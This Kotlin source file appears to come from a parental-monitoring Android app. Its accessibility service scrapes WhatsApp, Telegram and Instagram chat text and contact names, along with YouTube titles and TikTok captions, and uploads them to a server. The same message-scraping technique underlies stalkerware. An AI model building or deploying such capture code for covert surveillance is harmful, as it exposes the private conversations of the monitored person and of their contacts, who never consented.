package com.monitor.child.accessibility

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.monitor.child.appusage.AppBlocker
import com.monitor.child.data.PreferencesManager
import com.monitor.child.network.ApiClient
import com.monitor.child.network.MessageUploader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class MessageCaptureService : AccessibilityService() {

    companion object {
        private const val TAG = "MessageCaptureService"

        const val PKG_WHATSAPP          = "com.whatsapp"
        const val PKG_WHATSAPP_BUSINESS = "com.whatsapp.w4b"
        const val PKG_TELEGRAM          = "org.telegram.messenger"
        const val PKG_INSTAGRAM         = "com.instagram.android"
        const val PKG_YOUTUBE           = "com.google.android.youtube"
        const val PKG_TIKTOK            = "com.zhiliaoapp.musically"
        const val PKG_TIKTOK_ALT        = "com.ss.android.ugc.trill"

        private val MESSAGING_PKGS = setOf(
            PKG_WHATSAPP, PKG_WHATSAPP_BUSINESS, PKG_TELEGRAM, PKG_INSTAGRAM,
        )
        private val VIDEO_PKGS = setOf(PKG_YOUTUBE, PKG_TIKTOK, PKG_TIKTOK_ALT)
        private val ALL_PKGS   = MESSAGING_PKGS + VIDEO_PKGS
    }

    private lateinit var prefs: PreferencesManager
    private lateinit var uploader: MessageUploader
    private lateinit var appBlocker: AppBlocker
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Debounce: evita procesar el mismo texto dos veces seguidas por app
    private val lastProcessed = mutableMapOf<String, String>()
    // Último paquete en primer plano (para TYPE_WINDOW_STATE_CHANGED)
    private var lastForegroundPkg: String? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        prefs = PreferencesManager(this)
        val apiClient = ApiClient(prefs)
        uploader = MessageUploader(apiClient, prefs)
        appBlocker = AppBlocker(this, apiClient, prefs, scope)
        appBlocker.startMonitoring()
        Log.i(TAG, "AccessibilityService conectado")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val pkg = event?.packageName?.toString() ?: return
        if (pkg !in ALL_PKGS) return

        val type = event.eventType

        // Detectar cambio de app en primer plano para AppBlocker
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pkg != lastForegroundPkg) {
            lastForegroundPkg = pkg
            appBlocker.onAppForeground(pkg)
        }

        if (type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) return

        val root = rootInActiveWindow ?: return

        try {
            when (pkg) {
                PKG_WHATSAPP, PKG_WHATSAPP_BUSINESS -> parseWhatsApp(root, pkg)
                PKG_TELEGRAM                        -> parseTelegram(root)
                PKG_INSTAGRAM                       -> parseInstagram(root)
                PKG_YOUTUBE                         -> parseYouTube(root)
                PKG_TIKTOK, PKG_TIKTOK_ALT          -> parseTikTok(root, pkg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing $pkg: ${e.message}")
        } finally {
            root.recycle()
        }
    }

    // ─── WhatsApp ─────────────────────────────────────────────────────────

    private fun parseWhatsApp(root: AccessibilityNodeInfo, pkg: String) {
        val contactName = findNodeText(root, "com.whatsapp:id/conversation_contact_name")
            ?: findNodeText(root, "com.whatsapp:id/contact_name")
            ?: return

        val messageNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text")
        if (messageNodes.isNullOrEmpty()) return

        val messages = mutableListOf<RawMessage>()
        for (node in messageNodes) {
            val text = node.text?.toString() ?: continue
            if (text.isBlank()) continue
            val direction = guessWhatsAppDirection(node)
            messages.add(RawMessage(contactName, text, direction))
        }

        if (messages.isEmpty()) return

        val key = "$pkg:$contactName"
        val fingerprint = messages.joinToString("|") { it.body }
        if (lastProcessed[key] == fingerprint) return
        lastProcessed[key] = fingerprint

        scope.launch {
            uploader.uploadMessages(
                app = "whatsapp",
                contactName = contactName,
                contactIdentifier = contactName,
                messages = messages,
            )
        }
    }

    private fun guessWhatsAppDirection(node: AccessibilityNodeInfo): String {
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 5) {
            val id = parent.viewIdResourceName ?: ""
            if (id.contains("out") || id.contains("sent")) return "outgoing"
            if (id.contains("in") || id.contains("received")) return "incoming"
            parent = parent.parent
            depth++
        }
        return "incoming"
    }

    // ─── Telegram ─────────────────────────────────────────────────────────

    private fun parseTelegram(root: AccessibilityNodeInfo) {
        val contactName = findNodeText(root, "org.telegram.messenger:id/name_text")
            ?: findNodeText(root, "org.telegram.messenger:id/title")
            ?: return

        val messageNodes = root.findAccessibilityNodeInfosByViewId(
            "org.telegram.messenger:id/message_text"
        ) ?: return

        val messages = mutableListOf<RawMessage>()
        for (node in messageNodes) {
            val text = node.text?.toString() ?: continue
            if (text.isBlank()) continue
            messages.add(RawMessage(contactName, text, "incoming"))
        }

        if (messages.isEmpty()) return

        val fingerprint = messages.joinToString("|") { it.body }
        if (lastProcessed["telegram:$contactName"] == fingerprint) return
        lastProcessed["telegram:$contactName"] = fingerprint

        scope.launch {
            uploader.uploadMessages(
                app = "telegram",
                contactName = contactName,
                contactIdentifier = contactName,
                messages = messages,
            )
        }
    }

    // ─── Instagram DMs ────────────────────────────────────────────────────

    private fun parseInstagram(root: AccessibilityNodeInfo) {
        val contactName = findNodeText(root, "com.instagram.android:id/action_bar_title") ?: return

        val allTexts = mutableListOf<AccessibilityNodeInfo>()
        collectTextNodes(root, allTexts)

        val messages = mutableListOf<RawMessage>()
        for (node in allTexts) {
            val text = node.text?.toString() ?: continue
            if (text.isBlank() || text == contactName) continue
            messages.add(RawMessage(contactName, text, "incoming"))
        }

        if (messages.isEmpty()) return

        val fingerprint = messages.takeLast(5).joinToString("|") { it.body }
        if (lastProcessed["instagram:$contactName"] == fingerprint) return
        lastProcessed["instagram:$contactName"] = fingerprint

        scope.launch {
            uploader.uploadMessages(
                app = "instagram",
                contactName = contactName,
                contactIdentifier = contactName,
                messages = messages.takeLast(20),
            )
        }
    }

    // ─── YouTube ──────────────────────────────────────────────────────────

    private fun parseYouTube(root: AccessibilityNodeInfo) {
        // El título del vídeo actual aparece en varios viewIds según versión de YouTube
        val title = findNodeText(root, "com.google.android.youtube:id/watch_title")
            ?: findNodeText(root, "com.google.android.youtube:id/video_title")
            ?: findNodeText(root, "com.google.android.youtube:id/title")
            ?: return

        if (title.isBlank()) return

        val key = "youtube:title"
        if (lastProcessed[key] == title) return
        lastProcessed[key] = title

        // Guardamos como "mensaje" con app especial para que el padre lo vea
        scope.launch {
            uploader.uploadMessages(
                app = "youtube",
                contactName = null,
                contactIdentifier = "youtube_watch",
                messages = listOf(RawMessage("YouTube", title, "incoming")),
            )
        }
    }

    // ─── TikTok ───────────────────────────────────────────────────────────

    private fun parseTikTok(root: AccessibilityNodeInfo, pkg: String) {
        // TikTok muestra el nombre de usuario y descripción del vídeo
        val description = findNodeText(root, "$pkg:id/caption_description")
            ?: findNodeText(root, "$pkg:id/desc")
            ?: return

        if (description.isBlank()) return

        val author = findNodeText(root, "$pkg:id/author_name") ?: "TikTok"

        val key = "tiktok:desc"
        if (lastProcessed[key] == description) return
        lastProcessed[key] = description

        scope.launch {
            uploader.uploadMessages(
                app = "tiktok",
                contactName = author,
                contactIdentifier = "tiktok_feed",
                messages = listOf(RawMessage(author, description, "incoming")),
            )
        }
    }

    // ─── Utilidades ───────────────────────────────────────────────────────

    private fun findNodeText(root: AccessibilityNodeInfo, viewId: String): String? {
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        return nodes?.firstOrNull()?.text?.toString()?.takeIf { it.isNotBlank() }
    }

    private fun collectTextNodes(node: AccessibilityNodeInfo, result: MutableList<AccessibilityNodeInfo>) {
        if (!node.text.isNullOrBlank()) result.add(node)
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectTextNodes(child, result)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AccessibilityService interrumpido")
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}

data class RawMessage(
    val contactName: String?,
    val body: String,
    val direction: String,
)
